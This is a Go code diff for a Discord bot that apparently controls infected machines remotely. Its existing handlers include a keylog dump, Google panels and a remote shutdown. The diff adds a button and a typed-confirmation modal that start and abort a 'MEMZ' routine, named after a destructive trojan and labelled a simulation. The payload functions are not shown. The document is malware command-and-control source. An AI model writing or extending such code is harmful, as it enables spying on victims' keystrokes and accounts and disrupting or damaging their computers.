@@ -102,6 +102,10 @@ func handleComponent(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		commands.KeylogDump(s, i)
 	case customID == "btn_google_close":
 		commands.GooglePanel(s, i)
+	case customID == "btn_memz":
+		showMemzModal(s, i)
+	case customID == "btn_memz_abort":
+		commands.MemzAbort(s, i)
 	case customID == "btn_google_refresh":
 		commands.GoogleRefresh(s, i)
 	case customID == "btn_google_all":
@@ -168,6 +172,12 @@ func handleModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			return
 		}
 		commands.Shutdown(s, i)
+	case "modal_memz":
+		if value != "MEMZ" {
+			_ = commands.Reply(s, i, "❌ Confirmación incorrecta. Escribe MEMZ.")
+			return
+		}
+		commands.MemzStart(s, i)
 	default:
 		_ = commands.Reply(s, i, "⚠️ Modal desconocido: `"+data.CustomID+"`.")
 	}
@@ -204,6 +214,28 @@ func showKillModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
 						Placeholder: "CONFIRM",
 						Required:    true,
 						MaxLength:   16,
+					},
+				}},
+			},
+		},
+	})
+}
+
+func showMemzModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
+	_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+		Type: discordgo.InteractionResponseModal,
+		Data: &discordgo.InteractionResponseData{
+			CustomID: "modal_memz",
+			Title:    "Confirmar MEMZ",
+			Components: []discordgo.MessageComponent{
+				discordgo.ActionsRow{Components: []discordgo.MessageComponent{
+					discordgo.TextInput{
+						CustomID:    "confirm",
+						Label:       "Escribe MEMZ para iniciar la simulación",
+						Style:       discordgo.TextInputShort,
+						Placeholder: "MEMZ",
+						Required:    true,
+						MaxLength:   8,
 					},
 				}},
 			},
